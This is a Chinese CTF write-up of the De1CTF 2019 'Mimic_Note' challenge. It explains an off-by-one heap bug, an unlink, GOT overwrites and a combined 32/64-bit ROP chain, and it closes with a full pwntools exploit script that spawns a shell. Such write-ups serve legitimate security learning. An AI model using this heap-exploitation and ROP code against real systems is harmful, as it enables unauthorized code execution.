---
title: De1CTF Mimic_Note
catergories: 
- De1CTF2019
---
# de1ctf Mimic_Note

## 前言

第二题做的我又自闭了，想想七哥和姚老板比赛当日拿这么难的方法抢到了三血真是太厉害了，后来看官方的wp说程序的mimic_server并不是要求同时跑通64和32，而是只要输出一致即可，所以程序考察的是不泄露libc的ROP，可以用re2dl_resolve做，但是学长的exp是直接实现了一个拟态的exp，里面用到了很多我找都没找到的gadgets。。最重要的是拟态题的数据错位输入和一些同步触发的要求，这题自己也做不出，只能看着学长的exp慢慢调试，感觉收获了很多。

## 程序逻辑

libc2.23，程序可以new、edit、free、其中edit有一个off-by-one，固定多输入一个零字符。got表可写。

## 漏洞利用

基本思路是unlink之后修改atoi为某个gadgets触发栈迁移，之后把write@got改成syscall。具体实现过程中要注意修改atoi的操作要32和64同步进行，顺序修改的时候会引发异常(比如修改32的atoi再修改64的aoti在32位运行时第二次修改已经不能正常使用edit)。

为了解决同时修改atoi：32和64在heap_list各占据一块位置，unlink后32位在heap_list_0处放p32(atoi_got_32)，64位在heap_list_0处方p64(atoi_got_64-8)，这样一次Edit(p32(gadgets_32)+p32(0)+p64(gadgets_64))即可同步修改两个atoi。

另一个问题是如何在一次输入数据时候触发两个ROP(顺序触发ROP还是之前说的问题，atoi不能正常使用之后第二次的edit是不能用的)。这个在stkof里我们有经验，要利用数据的错位，比如32位里可以直接pop ebp;leave ret;而64位可以把前8字节数据pop到rsi再pop rbp,leave ret;这样(即使这样，32位的栈迁移gadgets也没有找到)。

一些细节：因为64位要输入两次数据，32位输入一次数据，我们可以把32位的输入放后面并且在32的ROP里加入前两次输入，而64不需要管这些，后面拿到shell之后send一次垃圾数据也无所谓。

unlink之后覆写不要挑free的块写，因为在另一个arch下这里是不能写的。

还有ROP本身的问题，64bit ROP通过read设置rax，之后通过csu拿shell，但是32bit始终做不到ebx=binsh_addr的时候ecx=edx=0，看了17的exp发现并不是通过read设置的eax，而是通过先pop ebp设置ebp  = 0x2c+0xb,后用lea eax,[ebp-0x2c]设置eax=0xb，在此之前read(0,0,0)将eax,ebx,ecx,edx全部清空，从而构造完成，注意之后还要call一次atoi，这时atoi已经被改为gadgets，因此要再迁回bss上，最后p_ebx再syscall即可。

关键gadgets:

1. 32atoi->gadgets:(found by 17)
```asm
text:080489EE                 add     esp, 10h
.text:080489F1                 cmp     edi, esi
.text:080489F3                 jnz     short loc_80489D8
.text:080489F5
.text:080489F5 loc_80489F5:                            ; CODE XREF: __libc_csu_init+2E↑j
.text:080489F5                 add     esp, 0Ch
.text:080489F8                 pop     ebx
.text:080489F9                 pop     esi
.text:080489FA                 pop     edi
.text:080489FB                 pop     ebp
.text:080489FC                 retn
```
2. 64atoi->gadgets:
```data
0x0000000000400c2f : pop rbp ; pop r14 ; pop r15 ; ret
```
3. 32栈迁移gadgets->leave_ret_32
4. 64栈迁移gadgets:(注意pop rsp之后就迁移到bss了)
```data
0x0000000000400c2d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
```
5. 32设置eax
```asm
.text:08048907                 lea     eax, [ebp-2Ch]
.text:0804890A                 push    eax             ; nptr
.text:0804890B                 call    _atoi
```

## exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal=['tmux','split','-h']
debug = 1
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf64 = ELF('./mimic_note_64')
elf32 = ELF('./mimic_note_32')
if debug:
    #p = process('./mimic_note_64')
    p = process('./mimic_note_32')

else:
    p = remote('45.32.120.212',6666)

def New(size):
    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil('size?\n')
    p.sendline(str(size))

def Delete(index):
    p.recvuntil('>> ')
    p.sendline('2')
    p.recvuntil('index ?\n')
    p.sendline(str(index))

def Show(index):
    p.recvuntil('>> ')
    p.sendline('3')
    p.recvuntil('index ?\n')
    p.sendline(str(index))

def Edit(index,content):
    p.recvuntil('>> ')
    p.sendline('4')
    p.recvuntil('index ?\n')
    p.sendline(str(index))
    p.recvuntil('content?')
    p.send(content)

def exp():
    #64 bit unlink
    heap_lis_64 = 0x6020A0
    fd = heap_lis_64 - 0x18
    bk = heap_lis_64 - 0x10
    payload = p64(0)+p64(0x30)+p64(fd)+p64(bk)+p64(0)*2+p64(0x30)
    New(0x38)#0
    New(0xf8)#1
    New(0xf7)#2
    #paddings
    for i in range(10):
        New(0x68)#3-12
    New(0x1c)#13
    New(0xfc)#14
    New(0xf7)#15
    Edit(0,payload)

    Delete(1)

    #32 bit unlink
    heap_lis_32 = 0x0804a060
    fd = heap_lis_32 + 8*13 - 0xc
    bk = heap_lis_32 + 8*13 - 0x8
    payload = p32(0)+p32(0x18)+p32(fd)+p32(bk)+"a"*8+p32(0x18)
    Edit(13,payload)

    Delete(14)

    #64 bit ROP
    bss_64 = elf64.bss()+0x200
    atoi_got_64 = elf64.got['atoi']
    write_got_64 = elf64.got['write']
    write_plt_64 = elf64.plt['write']
    read_plt_64 = elf64.plt['read']
    read_got_64 = elf64.got['read']
    payload = p64(0)*3
    payload += p64(heap_lis_64)+p64(0x1000)
    Edit(0,payload)

    payload = p64(atoi_got_64-8)+p64(0x20)
    payload += p64(bss_64)+p64(0x100)
    payload += p64(bss_64)+p64(0x100)
    payload += p64(write_got_64)
    Edit(0,payload)
    #csu
    p_rdi = 0x400c33
    p_rsi_r15 = 0x400c31
    rop_64 = "/bin/sh\x00"+p64(bss_64+0x200)
    #set rax
    rop_64 += p64(p_rdi)+p64(0)
    rop_64 += p64(p_rsi_r15)+p64(write_got_64)+p64(0)
    rop_64 += p64(read_plt_64)
    #
    rop_64 += p64(0x400c2a)
    rop_64 += p64(0)+p64(1)+p64(read_got_64)+p64(0x100)+p64(bss_64+0x100)+p64(0)+p64(0x400c10)+'a'*0x38
    rop_64 += p64(0x400c2a)+p64(0)+p64(1)+p64(write_got_64)+p64(0)+p64(0)+p64(bss_64)+p64(0x400c10)+'a'*0x38

    Edit(2,rop_64)
    #set rax=59
    #ovwerite aoti
    p_rbp64 = 0x400770
    leave_ret64 = 0x4008b7

    #gdb.attach(p,'b* 0x400b32')
        #trigger 64
    atoi_got_32 = elf32.got['atoi']
    read_got_32 = elf32.got['read']
    read_plt_32 = elf32.plt['read']
    write_got_32 = elf32.got['write']
    write_plt_32 = elf32.plt['write']
    #32 bit ROP
    bss_32 = elf32.bss()+0x100
    Edit(13,p32(0x100)+p32(heap_lis_32)+p32(0x100)+p32(bss_32)+p32(0x200))
    Edit(12,p32(atoi_got_32)+p32(0x100))
    #12:aoti_got
    #13:bss
    leave_ret32 = 0x08048568
    p4_32 = 0x80489f8
    p_ebx_32 = 0x08048439
    rop32 = "/bin/sh\x00"+p32(bss_32+0x100)
    #set syscall
    rop32 += p32(read_plt_32)+p32(p4_32)+p32(0)+p32(bss_32+0x300)+p32(0x100)+p32(bss_32+0xc+0x14)#for rop64
    rop32 += p32(read_plt_32)+p32(p4_32)+p32(0)+p32(bss_32+0x300)+p32(0x100)+p32(bss_32+0xc+0x14)#for rop64
    rop32 += p32(read_plt_32)+p32(p4_32)+p32(0)+p32(write_got_32)+p32(0x100)+p32(bss_32+0xc+0x14)
    #set eax
    rop32 += p32(read_plt_32)+p32(p4_32)+p32(0)*4
    rop32 += p32(0x080489f9)+p32(0)*2+p32(0xb+0x2c)+p32(0x08048907)
    rop32 += p32(0)*9
    rop32 += p32(0x08048588)
    rop32 += p32(p_ebx_32)+p32(0x804a1f4)+p32(write_plt_32)+"/bin/sh\x00"

    Edit(13,rop32)
    #migration
    mig_32 = 0x080489ee

    #set migration
    prbp_2ret_64 = 0x400c2f
    Edit(0,p32(mig_32)+p32(0)+p64(prbp_2ret_64))
    #p.sendafter(">> ",p64(p_rbp64)+p64(bss_64+8)+p64(leave_ret64))
    #gdb.attach(p,'b* 0x0804890b')
    #gdb.attach(p,'b* 0x400b32')
    p.sendafter(">> ","a"*4+"b"*4+p32(bss_32+8)+p32(leave_ret32)+p64(0x400c2d)+p64(bss_64-8)[:6])
    raw_input()
    p.send('\xbe')
    raw_input()
    p.send("\x00"*59)


    #p.sendafter(">> ","a"*4+"b"*4+p32(bss_32+8)+p32(leave_ret32))
    raw_input()
    p.send("\x8c")
    #raw_input()
    p.interactive()

exp()
```

## 后言

花了两天时间才差不多搞懂，要再膜一些17学长和姚老板，路漫漫其修远其，吾将上下而求索。

## 参考

[17师傅](https://sunichi.github.io/2019/08/08/de1ctf19-pwn/)
